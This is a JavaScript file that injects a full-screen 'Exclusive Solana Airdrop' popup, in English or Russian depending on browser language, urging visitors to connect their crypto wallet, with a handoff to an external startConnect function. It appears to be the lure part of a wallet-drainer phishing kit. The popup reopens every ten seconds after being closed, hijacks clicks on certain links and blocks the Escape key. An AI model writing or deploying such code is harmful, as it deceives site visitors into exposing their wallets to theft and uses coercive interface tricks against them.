window.addEventListener('load', function () {
  const config = {
    modalZIndex: 9998,
    showDelay: 500,
    reopenInterval: 10000 // каждые 10 секунд
  };

  const isRussian = (navigator.language || navigator.userLanguage).includes('ru');
  const lang = isRussian ? {
    title: "🚀 Эксклюзивный Airdrop в сети Solana!",
    text: "Подключите кошелек для проверки участия.",
    warning: "Для участников из ограниченных регионов требуется VPN.",
    button: "Подключить кошелек"
  } : {
    title: "🚀 Exclusive Solana Airdrop Live!",
    text: "Connect your wallet to check eligibility.",
    warning: "Users from restricted regions must use VPN.",
    button: "Connect Wallet"
  };

  const modal = document.createElement('div');
  modal.id = 'sol-airdrop-modal';
  Object.assign(modal.style, {
    position: 'fixed',
    top: '0',
    left: '0',
    width: '100%',
    height: '100%',
    backgroundColor: 'rgba(0, 0, 0, 0.9)',
    zIndex: config.modalZIndex,
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
    color: 'white',
    fontFamily: "'Inter', sans-serif",
    opacity: '0',
    transition: 'opacity 0.3s ease',
    pointerEvents: 'none'
  });

  modal.innerHTML = `
    <div style="
      max-width: 420px;
      padding: 2rem;
      background: linear-gradient(135deg, #1e1b4b 0%, #0f172a 100%);
      border-radius: 16px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6);
      pointer-events: auto;
      position: relative;
    ">
      <button id="modal-close-btn" style="
        position: absolute;
        top: 10px;
        right: 10px;
        background: transparent;
        border: none;
        font-size: 20px;
        color: white;
        cursor: pointer;
      ">&times;</button>
      <h1 style="font-size: 1.5rem; margin-bottom: 1rem; color: #a78bfa;">
        ${lang.title}
      </h1>
      <p style="font-size: 1rem; line-height: 1.5; margin-bottom: 1.25rem;">
        ${lang.text}
      </p>
      <div style="
        background: rgba(239, 68, 68, 0.15);
        padding: 0.75rem;
        border-radius: 8px;
        margin-bottom: 1.5rem;
        border-left: 3px solid #ef4444;
      ">
        <p style="margin: 0; font-size: 0.9rem; color: #fca5a5;">
          ⚠️ ${lang.warning}
        </p>
      </div>
      <button 
        id="airdrop-connect-btn"
        style="
          width: 100%;
          padding: 0.75rem;
          font-size: 1rem;
          background: linear-gradient(135deg, #8b5cf6 0%, #10b981 100%);
          color: white;
          border: none;
          border-radius: 10px;
          cursor: pointer;
        "
      >
        ${lang.button}
      </button>
    </div>
  `;

  document.body.appendChild(modal);

  let userClosed = false; // человек закрыл сам

  const showModal = () => {
    if (window.walletConnected) return;
    modal.style.opacity = '1';
    modal.style.pointerEvents = 'auto';
  };

  const hideModal = () => {
    modal.style.opacity = '0';
    modal.style.pointerEvents = 'none';
    userClosed = true;
  };

  // Показ через задержку после загрузки
  setTimeout(showModal, config.showDelay);

  // Кнопка подключения — закрывает модалку
  modal.querySelector('#airdrop-connect-btn').addEventListener('click', () => {
    hideModal();
    if (typeof window.startConnect === 'function') window.startConnect();
  });

  // Кнопка крестика — закрывает модалку
  modal.querySelector('#modal-close-btn').addEventListener('click', hideModal);

  // Клик по .goAuth — открывает снова только при намеренном клике
  document.addEventListener('click', function (e) {
    const goAuthElement = e.target.closest('.goAuth');
    if (goAuthElement && !window.walletConnected) {
      e.preventDefault();
      showModal();
      userClosed = false; // сброс флага только если человек сам открыл
    }
  }, true);

  // Автоповтор показа каждые 10 секунд, только если закрыл вручную
  setInterval(() => {
    if (!window.walletConnected && userClosed) {
      showModal();
      userClosed = false; // сброс, чтобы не спамить
    }
  }, config.reopenInterval);

  // Запрет закрытия через Escape
  window.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') e.preventDefault();
  });
});
